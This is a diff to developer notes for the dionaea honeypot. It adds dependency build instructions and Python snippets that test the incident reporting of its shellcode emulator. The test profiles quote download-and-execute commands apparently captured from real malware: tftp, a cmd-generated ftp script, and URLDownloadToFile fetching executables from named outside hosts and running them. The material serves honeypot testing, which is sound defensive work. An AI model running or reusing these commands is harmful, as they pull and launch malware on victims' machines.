@@ -1,3 +1,70 @@
+Installation:
+
+svn co https://svn.carnivore.it/liblcfg/code/trunk liblcfg
+cd liblcfg
+autoreconf -vi
+./configure --prefix=/opt/dionaea
+make install
+cd ..
+
+svn co https://svn.carnivore.it/libemu/trunk libemu
+cd libemu
+autoreconf -vi
+./configure --prefix=/opt/dionaea
+make install
+cd ..
+
+
+git clone git://git.kernel.org/pub/scm/libs/netlink/libnl.git
+cd libnl
+autoreconf -vi
+export LDFLAGS=-Wl,-rpath,/opt/dionaea/lib
+./configure --prefix=/opt/dionaea
+make
+make install
+cd ..
+
+wget http://dist.schmorp.de/libev/libev-3.6.tar.gz
+tar xfz libev-3.6.tar.gz
+cd libev-3.6
+./configure --prefix=/opt/dionaea
+make install
+cd ..
+
+wget http://cython.org/Cython-0.11.2.tar.gz
+tar xfz Cython-0.11.2.tar.gz
+cd Cython-0.11.2        
+python setup.py build
+sudo python setup.py install
+cd ..
+
+wget http://python.org/ftp/python/3.1/Python-3.1.tgz
+tar xfz Python-3.1.tgz
+cd Python-3.1/
+./configure --enable-shared --prefix=/opt/dionaea --with-computed-gotos \
+      --enable-ipv6 LDFLAGS="-Wl,-rpath=/opt/dionaea/lib/"
+make
+make install
+cd ..
+
+wget http://www.corpit.ru/mjt/udns/udns_0.0.9.tar.gz
+tar xfz udns_0.0.9.tar.gz
+cd udns-0.0.9/
+./configure
+make shared
+cp udns.h /opt/dionaea/include/
+cp *.so* /opt/dionaea/lib/
+cd /opt/dionaea/lib
+ln -s libudns.so.0 libudns.so
+cd -
+cd ..
+
+
+wget http://curl.haxx.se/download/curl-7.19.6.tar.bz2
+tar xfj curl-7.19.6.tar.bz2
+./configure --prefix=/opt/dionaea
+make install
+cd ..
 
 Some usefull commands for the cli to test things:
 
@@ -33,6 +100,31 @@ class idumper(ihandler):
 a = idumper('*')
 
 
+p='[{"call": "CreateProcess", "args": ["", "tftp.exe -i 92.17.46.208 get ssms.exe", "", "", "1", "40", "", "", {"dwXCountChars": "0", "dwFillAttribute": "0", "hStdInput": "0", "dwYCountChars": "0", "cbReserved2": "0", "cb": "0", "dwX": "0", "dwY": "0", "dwXSize": "0", "lpDesktop": "0", "hStdError": "68", "dwFlags": "0", "lpReserved": "0", "lpReserved2": "0", "hStdOutput": "0", "lpTitle": "0", "dwYSize": "0", "wShowWindow": "0"}, {"dwProcessId": "4712", "hProcess": "4711", "dwThreadId": "4714", "hThread": "4712"}], "return": "-1"}, {"call": "CreateProcess", "args": ["", "ssms.exe", "", "", "1", "40", "", "", {"dwXCountChars": "0", "dwFillAttribute": "0", "hStdInput": "0", "dwYCountChars": "0", "cbReserved2": "0", "cb": "0", "dwX": "0", "dwY": "0", "dwXSize": "0", "lpDesktop": "0", "hStdError": "68", "dwFlags": "0", "lpReserved": "0", "lpReserved2": "0", "hStdOutput": "0", "lpTitle": "0", "dwYSize": "0", "wShowWindow": "0"}, {"dwProcessId": "4712", "hProcess": "4711", "dwThreadId": "4714", "hThread": "4712"}], "return": "-1"}, {"call": "ExitThread", "args": ["0"], "return": "0"}]'
+from dionaea import incident
+i = incident("dionaea.module.emu.profile")
+i.set("profile", str(p))
+i.report()
+
+
+p='[{"call": "WinExec", "args": ["cmd /c echo open welovewarez.com 21 > i&echo user wat l0l1 >> i &echo get SCUM.EXE >> i &echo quit >> i &ftp -n -s:i &SCUM.EXE\\r\\n", "0"], "return": "32"}, {"call": "ExitThread", "args": ["0"], "return": "0"}]'
+from dionaea import incident
+i = incident("dionaea.module.emu.profile")
+i.set("profile", str(p))
+i.report()
+
+p='[{"call": "LoadLibraryA", "args": ["urlmon"], "return": "0x7df20000"}, {"call": "URLDownloadToFile", "args": ["", "http://82.165.32.34/compiled.exe", "47.scr", "0", "0"], "return": "0"}, {"call": "WinExec", "args": ["47.scr", "895"], "return": "32"}]'
+from dionaea import incident
+i = incident("dionaea.module.emu.profile")
+i.set("profile", str(p))
+i.report()
+
+p='[{"call": "LoadLibraryA", "args": ["urlmon"], "return": "0x7df20000"}, {"call": "URLDownloadToFile", "args": ["", "http://justpwnd.com/expnew.exe", "01.exe", "0", "0"], "return": "0"}, {"call": "WinExec", "args": ["01.exe", "895"], "return": "32"}]'
+from dionaea import incident
+i = incident("dionaea.module.emu.profile")
+i.set("profile", str(p))
+i.report()
+
 #logging
 import logging
 logger = logging.getLogger("foobar")
@@ -45,3 +137,9 @@ logger.error("error message")
 #config
 from dionaea import g_dionaea
 g_dionaea.config()
+
+#cli
+import rlcompleter, readline
+readline.parse_and_bind('tab: complete')
+import dionaea
+dionaea.[tab][tab]
